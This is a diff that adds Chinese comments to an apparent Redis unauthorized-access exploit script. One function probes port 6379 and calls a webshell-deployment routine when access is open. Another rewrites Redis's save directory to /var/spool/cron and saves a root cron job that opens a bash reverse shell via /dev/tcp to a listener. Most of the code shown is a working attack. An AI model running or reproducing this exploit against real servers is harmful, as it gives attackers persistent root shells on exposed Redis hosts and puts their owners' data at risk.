@@ -31,15 +31,23 @@ def check_redis_connect(ip):
     :param ip: 需要检查的 IP 地址
     """
     try:
+        # 尝试连接到指定IP地址的Redis服务器，设置超时时间为0.3秒
         r = redis.StrictRedis(host=ip, port=6379, socket_timeout=0.3)
-        info = r.info()  # 获取 Redis 服务器信息
+
+        # 获取 Redis 服务器信息
+        info = r.info()
+
+        # 如果成功获取到服务器信息，说明存在未授权访问
         if info:
             print(f"[+] {ip}  存在未授权访问")
             print(f"[+] {r.client_list()}")
+
+            # 调用exp_webShell函数，此处假设该函数用于利用漏洞部署webshell
             exp_webShell(r)
         else:
             print(f"[-] {ip} 不存在未授权访问")
     except redis.ConnectionError:
+        # 如果无法连接到Redis服务器，捕获ConnectionError异常
         print(f"[-] 无法连接到 {ip}:6379")
         return
 
@@ -62,10 +70,16 @@ def exp_crontab(redis_client):
 
     :param redis_client: Redis 客户端对象
     """
+    # 设置Redis数据目录为'/var/spool/cron'
     root = '/var/spool/cron'
+    # 配置Redis保存目录
     redis_client.config_set('dir', root)
+    # 配置Redis数据文件名为'root'
     redis_client.config_set('dbfilename', 'root')
+    # 设置定时任务执行命令
     redis_client.set('x', '\n\n*/1 * * * * /bin/bash -i > & /dev/tcp/127.0.0.1/8888 0>&1\n\n')
+    # 保存配置和数据
     redis_client.save()
+    # 打印成功创建定时任务的消息
     print(f"[+] 定时任务已创建")
 
